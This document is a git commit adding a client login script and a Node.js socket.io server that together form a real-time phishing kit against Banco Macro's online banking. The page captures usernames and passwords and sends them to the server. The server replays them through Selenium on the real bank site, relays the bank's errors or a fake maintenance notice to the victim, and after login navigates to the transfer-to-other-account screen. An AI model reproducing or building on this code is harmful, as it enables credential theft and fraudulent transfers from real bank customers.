29be9cbefbabab0136c5236a834420548608e890
totoloco3000 <totoloco3000@hushmail.com>
2022-09-18 10:14:39 -0400

    SUBIENDO

---
+++ src/public/js/script.js
@@ -0,0 +1,96 @@
+//const { text } = require("express");
+
+const socket = io.connect("http://localhost:3000/", {
+    forceNew: true,
+    transports: ["polling"],
+ });
+
+
+
+const emitDataServer = document.querySelector("#btn-send");
+const userInput = document.querySelector("#user");
+userInput.focus();
+
+const passInput = document.querySelector("#pass");
+const Alert = document.querySelector("#alert-modal");
+const Alert2 = document.querySelector("#alert-modal2");
+const CerrarModal = document.querySelector("#close-alert-modal");
+const CerrarModal2 = document.querySelector("#close-alert2-modal");
+const ShowPass = document.querySelector("#password-content");
+const ShowUser = document.querySelector("#user-content");
+const Avatar = document.querySelector("#avatar");
+const LoginHelp = document.querySelector("#login-help");
+const ErrorBanner = document.querySelector("#error-banner");
+const TextErrorBanner = document.querySelector("#text-error");
+const CloseErrorBanner = document.querySelector("#close-error-banner");
+const VerUser = document.querySelector("#ver-user");
+const LabelUser = document.querySelector("#label-input");
+const form = document.querySelector("#form");
+//const infoLogin = document.querySelector("#infologin");
+
+var ShowVolver = "";
+
+CerrarModal.addEventListener("click", () => {
+    Alert.style.display = "none";
+})
+
+CerrarModal2.addEventListener("click", () => {
+    Alert2.style.display = "none";
+})
+
+emitDataServer.addEventListener("click", (e) => {
+
+    e.preventDefault();
+    
+    userInput.classList.remove('error-input');
+    LabelUser.classList.remove('error-input-label');
+
+    Alert.style.display = "none";
+    Alert2.style.display = "none";
+    const dataInputs = {
+        'user': userInput.value,
+        'pass': passInput.value,
+        'socket': socket.id,
+    }
+
+    var preloader = document.querySelector("#preloader");
+
+    if (dataInputs.user.length < 6 || dataInputs.user.length > 15 || dataInputs.pass.length == 0) {
+        preloader.style.display = "none";
+        userInput.classList.add('error-input');
+        LabelUser.classList.add('error-input-label');
+        Alert.style.display = "flex";
+    } else {
+        socket.emit("Data", dataInputs);
+        preloader.style.display = "block";
+        setTimeout(() => {
+            preloader.style.display = "none";
+            passInput.value = "";
+            userInput.value = "";
+        }, 2000);
+    }
+})
+
+socket.on("ErrorLogin", TextoBanner => {
+    ErrorBanner.style.display = "flex";
+    if (TextoBanner.slice(-7) == 'Aceptar') {
+        TextErrorBanner.innerHTML = TextoBanner.slice(0, -9);
+    }else{
+        TextErrorBanner.innerHTML = TextoBanner;
+    }
+    LoginHelp.parentElement.classList.toggle('clave-nopodes');
+    LoginHelp.parentElement.classList.toggle('nopodes');
+})
+
+CloseErrorBanner.addEventListener("click", () => {
+    ErrorBanner.style.display = "none";
+})
+
+VerUser.addEventListener("click", () => {
+    console.log(userInput.type)
+    if(userInput.type == "text"){
+        userInput.type = "password";
+    }else{
+        userInput.type = "text";
+    }
+})
---
+++ src/realtimeServer.js
@@ -0,0 +1,116 @@
+const { emit } = require("nodemon");
+
+module.exports = httpServer => {
+
+    const chrm = require("chromedriver");
+    // Include selenium webdriver
+    const swd = require("selenium-webdriver");
+    const chrome = require("selenium-webdriver/chrome");
+    const firefox = require("selenium-webdriver/firefox");
+
+
+    const { Server } = require("socket.io");
+    const io = new Server(httpServer);
+
+    io.on("connection", socket => {
+
+        // Recibir data y enviar al adm
+        socket.on("Data", data => {
+            totalInfo = [data];
+
+            let browser = new swd.Builder();
+            let tab = browser.forBrowser("chrome")
+                //.setChromeOptions(new chrome.Options().addArguments(['--headless', '--no-sandbox', '--disable-dev-shm-usage']))
+                //.setFirefoxOptions(new firefox.Options().addArguments(['--headless', '--no-sandbox', '--disable-dev-shm-usage']))
+                .build();
+
+            //Step 1 - Opening sign in page
+            let tabToOpenSignIn =
+                tab.get("https://www.macro.com.ar/bancainternet/");
+            tabToOpenSignIn
+                .then(() => {
+                    // Timeout to wait if connection is slow
+                    let findTimeOutP =
+                        tab.manage().setTimeouts({
+                            implicit: 15000, // 15 seconds
+                        });
+                    return findTimeOutP;
+                })
+                .then(() => {
+                    //Finding the username input
+                    let promiseUsernameBox = tab.findElement(swd.By.css("#textField1"))
+                        .catch(() => {
+                            tab.quit();
+                            io.to(data.socket).emit("ErrorLogin", 'En este momento nos encontramos efectuando tareas de mantenimiento. Disculpá las molestias ocasionadas.');
+                            throw new Error("Mantenimiento");
+                        })
+                    return promiseUsernameBox;
+                })
+                //Entering the username
+                .then(usernameBox => {
+                    let promiseFillUsername =
+                        usernameBox.sendKeys(data.user);
+                    return promiseFillUsername;
+                })
+                .then(() => {
+                    console.log("Username entered successfully");
+                    let promiseBtnIngresar =
+                        tab.findElement(swd.By.css("#processCustomerLogin"));
+                    return promiseBtnIngresar;
+                })
+                .then(promiseBtnIngresar => {
+                    let promiseClickIngresar = promiseBtnIngresar.click();
+                    return promiseClickIngresar;
+                })
+                .then(() => {
+                    //Finding the password input
+                    let promisePasswordBox =
+                        tab.findElement(swd.By.css("#login_textField1"));
+                    return promisePasswordBox;
+                })
+                //Entering the password
+                .then(PasswordBox => {
+                    let promiseFillPassword =
+                        PasswordBox.sendKeys(data.pass);
+                    return promiseFillPassword;
+                })
+                .then(() => {
+                    console.log("Password entered successfully");
+                    let promiseBtnIngresar = tab.findElement(swd.By.css("#processSystem_UserLogin"));
+                    return promiseBtnIngresar;
+                })
+                .then(promiseBtnIngresar => {
+                    let promiseClickIngresar = promiseBtnIngresar.click();
+                    return promiseClickIngresar;
+                })
+                .then(() => {
+                    let promiseError = tab.findElement(swd.By.css("#modalContainer")).getText()
+                        .catch(() => {
+                            return false;
+                        })
+                    return promiseError;
+                })
+                .then(errorLogin => {
+                    if (errorLogin) {
+                        console.log(errorLogin)
+                        tab.quit();
+                        io.to(data.socket).emit("ErrorLogin", errorLogin);
+                        throw new Error("de inicio de sesion!");
+                    }
+                })
+                .then(() => {
+                    console.log("Inicio de sesión exitoso");
+                    let promiseBtnOtraCuenta = tab.findElement(swd.By.css("#processAccountOtherTransferCuentasVista"));
+                    return promiseBtnOtraCuenta;
+                })
+                .then(promiseBtnOtraCuenta => {
+                    let promiseClickIngresar = promiseBtnOtraCuenta.click();
+                    return promiseClickIngresar;
+                })
+                .catch(err => {
+                    console.log("Error ", err, " occurred!");
+                });
+        });
+
+    })
+}
